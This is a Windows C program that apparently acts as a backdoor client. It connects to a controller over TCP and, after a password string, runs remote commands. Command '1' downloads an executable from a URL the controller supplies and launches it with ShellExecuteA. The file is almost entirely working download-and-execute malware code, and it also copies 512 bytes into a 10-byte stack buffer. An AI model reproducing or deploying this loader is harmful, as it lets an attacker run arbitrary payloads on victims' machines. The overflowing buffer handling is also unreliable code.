#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

#include <urlmon.h> // for download file function
#include <tchar.h>

#include <shellapi.h>

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"


int __cdecl main(int argc, char **argv)
{
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;
	char recvbuf[DEFAULT_BUFLEN];
	char buffer[DEFAULT_BUFLEN];
	char data[DEFAULT_BUFLEN];

	int iResult;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo("localhost", DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) 
	{

		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) 
		{
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	ZeroMemory(recvbuf, DEFAULT_BUFLEN);
	iResult = recv(ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
	if (iResult > 0)
	{
		char buffer[DEFAULT_BUFLEN];
		strcpy(buffer, recvbuf);
		
		if (!strcmp(buffer, "!MD5PASSWORD"))
		{
			char command[10]; // Command's length is only 10
			while (1)
			{
				
				ZeroMemory(recvbuf, DEFAULT_BUFLEN);
				
				iResult = recv(ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
				if (iResult > 0)
				{
					strcpy(buffer,recvbuf);
					memcpy(command, buffer, DEFAULT_BUFLEN);
					char *ptr;
					HRESULT hr1;
					HINSTANCE hr2;
					switch (command[0])
					{
					case '1':
						ptr = command;
						ptr = ptr + 2;
						hr1 = URLDownloadToFile(NULL, ptr, "C:\\Users\\NOKIA\\Desktop\\x.exe", 0, NULL);
						Sleep(500);
						hr2 = ShellExecuteA(NULL, "open", "C:\\Users\\NOKIA\\Desktop\\x.exe", NULL, NULL, SW_SHOW);
						Sleep(1000);
//						DeleteFileA("C:\\Users\\NOKIA\\Desktop\\x.exe");
						break;
					case '2':
						closesocket(ConnectSocket);
						WSACleanup();
						return 0;
						break;
					default:
						break;
					}
					/*
					ZeroMemory(sendbuf, DEFAULT_BUFLEN);
					iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
					if (iResult == SOCKET_ERROR) {
						printf("send failed with error: %d\n", WSAGetLastError());
						closesocket(ConnectSocket);
						WSACleanup();
						return 1;
					}*/
				}
			}
		}
	}
	else
	{
		printf("recevied failed with error: %d\n", WSAGetLastError());
	}

	// cleanup
	closesocket(ConnectSocket);
	WSACleanup();

	return 0;
}